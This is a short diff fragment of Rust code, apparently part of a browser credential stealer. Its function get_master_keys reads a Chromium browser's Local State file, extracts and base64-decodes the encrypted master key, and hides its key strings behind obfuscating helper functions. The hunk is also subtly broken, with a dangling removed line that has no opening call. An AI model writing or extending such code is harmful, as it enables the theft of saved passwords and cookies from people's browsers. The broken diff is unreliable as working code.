@@ -35,14 +35,16 @@ pub fn extract_raw_app_bound_from_local_state(json: &Value) -> Option<Vec<u8>> {
 }
 
 pub fn get_master_keys(user_data_path: &Path, browser_name: &str) -> Option<MasterKeys> {
+    let _ = browser_name;
     let local_state = user_data_path.join(s_local_state());
-        browser_name, local_state, local_state.exists());
     let content = fs::read_to_string(&local_state).ok()?;
     let json: Value = serde_json::from_str(&content).ok()?;
 
     let os_crypt = s_os_crypt();
     let encrypted_key = s_encrypted_key();
     let enc_key = match json[&os_crypt][&encrypted_key].as_str() {
+        Some(k) => k,
+        None => return None,
     };
     let decoded = general_purpose::STANDARD.decode(enc_key).ok()?;
 
